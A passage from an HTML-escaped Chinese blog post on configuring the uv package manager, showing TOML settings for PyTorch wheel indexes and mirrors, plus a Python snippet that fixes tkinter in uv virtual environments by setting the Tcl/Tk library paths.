&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;name&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;torch-intel&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;url&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;https:&#x2F;&#x2F;pytorch-extension.intel.com&#x2F;release-whl&#x2F;stable&#x2F;cpu&#x2F;us&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;explicit&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-language z-toml&quot;&gt;true&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-table z-array z-begin z-toml&quot;&gt;[[&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-tag z-table z-array z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-table z-toml&quot;&gt;tool&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-table z-toml&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-table z-toml&quot;&gt;uv&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-table z-toml&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-table z-toml&quot;&gt;index&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-table z-array z-end z-toml&quot;&gt;]]&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;name&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;pytorch-cpu&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;url&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;https:&#x2F;&#x2F;download.pytorch.org&#x2F;whl&#x2F;cpu&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;explicit&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-language z-toml&quot;&gt;true&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;如果单纯使用这套模板会报错，并不会正确在阿里云里面下载torch，如果改掉了url的话，而应该在tool.uv里面添加一个find-links参数，这样就能有效的解决问题。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;toml&quot; class=&quot;language-toml z-code&quot;&gt;&lt;code class=&quot;language-toml&quot; data-lang=&quot;toml&quot;&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-table z-begin z-toml&quot;&gt;[&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-tag z-table z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-table z-toml&quot;&gt;tool&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-table z-toml&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-table z-toml&quot;&gt;uv&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-table z-end z-toml&quot;&gt;]&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;link-mode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;symlink&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;index-url&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;find-links&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pytorch-wheels&#x2F;cu118&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;参考：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;pytorch.org&#x2F;get-started&#x2F;previous-versions&#x2F;&quot;&gt;查找对应的torch版本&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;docs.astral.sh&#x2F;uv&#x2F;reference&#x2F;settings&#x2F;#pip_find-links&quot;&gt;uv.toml配置文件&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;can-t-use-tkinter-with-new-venv-set-up-with-uv&quot;&gt;Can’t use tkinter with new venv set up with uv&lt;a class=&quot;zola-anchor&quot; href=&quot;#can-t-use-tkinter-with-new-venv-set-up-with-uv&quot; aria-label=&quot;Anchor link for: can-t-use-tkinter-with-new-venv-set-up-with-uv&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;参考：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;astral-sh&#x2F;uv&#x2F;issues&#x2F;7036#issuecomment-2421594826&quot;&gt;这个issue的解决方法比较有效&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-from z-python&quot;&gt;from&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-meta z-import-source z-python&quot;&gt; &lt;span class=&quot;z-meta z-import-path z-python&quot;&gt;&lt;span class=&quot;z-meta z-import-name z-python&quot;&gt;os&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-python&quot;&gt;import&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt; &lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;environ&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-from z-python&quot;&gt;from&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-meta z-import-source z-python&quot;&gt; &lt;span class=&quot;z-meta z-import-path z-python&quot;&gt;&lt;span class=&quot;z-meta z-import-name z-python&quot;&gt;pathlib&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-python&quot;&gt;import&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt; &lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;Path&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-from z-python&quot;&gt;from&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-meta z-import-source z-python&quot;&gt; &lt;span class=&quot;z-meta z-import-path z-python&quot;&gt;&lt;span class=&quot;z-meta z-import-name z-python&quot;&gt;sys&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-python&quot;&gt;import&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt; &lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;base_prefix&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;environ&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-python&quot;&gt;[&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-arguments z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;TCL_LIBRARY&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-python&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-type z-python&quot;&gt;str&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;Path&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;base_prefix&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;&#x2F;&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;lib&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;&#x2F;&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;tcl8.6&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;environ&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-python&quot;&gt;[&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-arguments z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;TK_LIBRARY&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-python&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-type z-python&quot;&gt;str&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;Path&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;base_prefix&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;&#x2F;&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;lib&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-arithmetic z-python&quot;&gt;&#x2F;&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;tk8.6&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;environ&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-python&quot;&gt;[&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-arguments z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;TCL_LIBRARY&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-python&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-function z-python&quot;&gt;&lt;span class=&quot;z-support z-function z-builtin z-python&quot;&gt;print&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-meta z-generic-name z-python&quot;&gt;environ&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-python&quot;&gt;[&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-arguments z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;TK_LIBRARY&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-python&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-arguments z-end z-python&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-from z-python&quot;&gt;from&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-meta z-import-source z-python&quot;&gt; &lt;span class=&quot;z-meta z-import-path z-python&quot;&gt;&lt;span class=&quot;z-meta z-import-name z-python&quot;&gt;tkinter&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-python&quot;&gt;import&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-statement z-import z-python&quot;&gt; &lt;span class=&quot;z-constant z-language z-import-all z-python&quot;&gt;*&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
